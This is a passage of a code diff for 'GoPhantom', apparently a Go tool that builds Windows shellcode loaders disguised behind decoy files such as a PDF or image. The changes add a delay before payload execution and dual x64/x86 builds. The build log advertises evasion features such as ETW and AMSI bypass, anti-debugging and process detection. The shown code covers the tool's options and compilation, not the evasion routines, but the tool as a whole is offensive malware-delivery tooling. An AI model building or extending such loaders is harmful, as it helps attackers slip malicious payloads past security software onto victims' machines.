+		fmt.Fprintf(os.Stderr, "  -delay int\n        Delay N seconds before payload execution (default: 0)\n")
 		fmt.Fprintf(os.Stderr, "  -obfuscate\n        Enable sleep-obfuscation in generated loader\n")
 		fmt.Fprintf(os.Stderr, "  -mutate\n        Enable shellcode mutation with random NOPs\n")
 		fmt.Fprintf(os.Stderr, "  -h, --help\n        Show this help message\n\n")
 		fmt.Fprintf(os.Stderr, "Example:\n")
 		fmt.Fprintf(os.Stderr, "  %s -decoy document.pdf -payload beacon.bin -out loader.exe\n", os.Args[0])
-		fmt.Fprintf(os.Stderr, "  %s -decoy image.jpg -payload calc.bin -out calc_loader.exe -obfuscate -mutate\n\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "  %s -decoy image.jpg -payload calc.bin -out calc_loader.exe -obfuscate -mutate -delay 30\n\n", os.Args[0])
 	}
 	
 	// 检查帮助参数
@@ -710,6 +1505,7 @@ func main() {
 		EnableObfuscate:  *enableObfuscate,
 		EnableMutate:     *enableMutate,
 		EnableCompress:   *enableCompress,
+		DelaySeconds:     *delaySeconds,
 	}
 
 	log.Println("[+] Generating loader source code...")
@@ -752,7 +1548,7 @@ require golang.org/x/sys v0.34.0 // indirect
 	}
 	defer os.Remove(goModPath)
 
-	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
+	log.Printf("[+] Cross-compiling for windows/amd64 and windows/386...")
 	
 	// 显示启用的功能
 	var features []string
@@ -765,9 +1561,15 @@ require golang.org/x/sys v0.34.0 // indirect
 	if *enableMutate {
 		features = append(features, "Code Mutation")
 	}
+	if *delaySeconds > 0 {
+		features = append(features, fmt.Sprintf("Delay %ds", *delaySeconds))
+	}
 	
-	// 添加稳定性提示
-	features = append(features, "Stable Persistence Mode")
+	// 添加新增免杀特性
+	features = append(features, "ETW Bypass")
+	features = append(features, "AMSI Bypass")
+	features = append(features, "Anti-Debug")
+	features = append(features, "Process Detection")
 	
 	if len(features) > 0 {
 		log.Printf("[+] Enabled evasion features: %v", features)
@@ -779,34 +1581,61 @@ require golang.org/x/sys v0.34.0 // indirect
 	if err != nil {
 		log.Fatalf("[-] Failed to get absolute path: %v", err)
 	}
-	cmd := exec.Command("go", "build", "-mod=mod", "-o", absOutputFile, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
-	cmd.Dir = tmpDir  // 在临时目录中运行
 	
-	// 设置环境变量，确保交叉编译到 Windows
-	env := os.Environ()
-	env = append(env, "CGO_ENABLED=0")
-	// 移除 GO111MODULE=off，保持模块支持以便使用外部依赖
-	
-	// 只有在非 Windows 系统上才需要设置 GOOS
-	if runtime.GOOS != "windows" {
-		env = append(env, "GOOS=windows")
-		env = append(env, "GOARCH=amd64")
-	} else {
-		// 在 Windows 上，确保编译为 64 位
-		env = append(env, "GOARCH=amd64")
+	// 获取文件名和扩展名
+	ext := filepath.Ext(absOutputFile)
+	baseName := absOutputFile[:len(absOutputFile)-len(ext)]
+	if ext == "" {
+		ext = ".exe"
+		absOutputFile = absOutputFile + ext
 	}
 	
-	cmd.Env = env
+	// 编译 x64 版本
+	log.Printf("[+] Building x64 version...")
+	output64 := absOutputFile
+	cmd64 := exec.Command("go", "build", "-mod=mod", "-o", output64, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
+	cmd64.Dir = tmpDir
+	
+	env64 := os.Environ()
+	env64 = append(env64, "CGO_ENABLED=0")
+	env64 = append(env64, "GOOS=windows")
+	env64 = append(env64, "GOARCH=amd64")
+	cmd64.Env = env64
 
-	output, err := cmd.CombinedOutput()
+	output, err := cmd64.CombinedOutput()
 	if err != nil {
-		log.Printf("[-] Compilation failed: %v", err)
+		log.Printf("[-] x64 Compilation failed: %v", err)
 		if len(output) > 0 {
 			log.Printf("[-] Compiler output:\n%s", string(output))
 		}
-		log.Printf("[-] Try running with verbose output for more details")
 		os.Exit(1)
 	}
+	log.Printf("[✓] x64 build complete: %s", output64)
+	
+	// 编译 x86 版本
+	log.Printf("[+] Building x86 version...")
+	output32 := baseName + "_x86" + ext
+	cmd32 := exec.Command("go", "build", "-mod=mod", "-o", output32, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
+	cmd32.Dir = tmpDir
+	
+	env32 := os.Environ()
+	env32 = append(env32, "CGO_ENABLED=0")
+	env32 = append(env32, "GOOS=windows")
+	env32 = append(env32, "GOARCH=386")
+	cmd32.Env = env32
 
-	log.Printf("\n[✓] Successfully generated GoPhantom v1.3 loader: %s\n", *outputFile)
+	output, err = cmd32.CombinedOutput()
+	if err != nil {
+		log.Printf("[-] x86 Compilation failed: %v", err)
+		if len(output) > 0 {
+			log.Printf("[-] Compiler output:\n%s", string(output))
+		}
+		log.Printf("[!] x86 build failed, but x64 build succeeded")
+	} else {
+		log.Printf("[✓] x86 build complete: %s", output32)
+	}
+
+	log.Printf("\n[✓] Successfully generated GoPhantom v1.4 loaders!")
+	log.Printf("    x64: %s", output64)
+	log.Printf("    x86: %s", output32)
 }
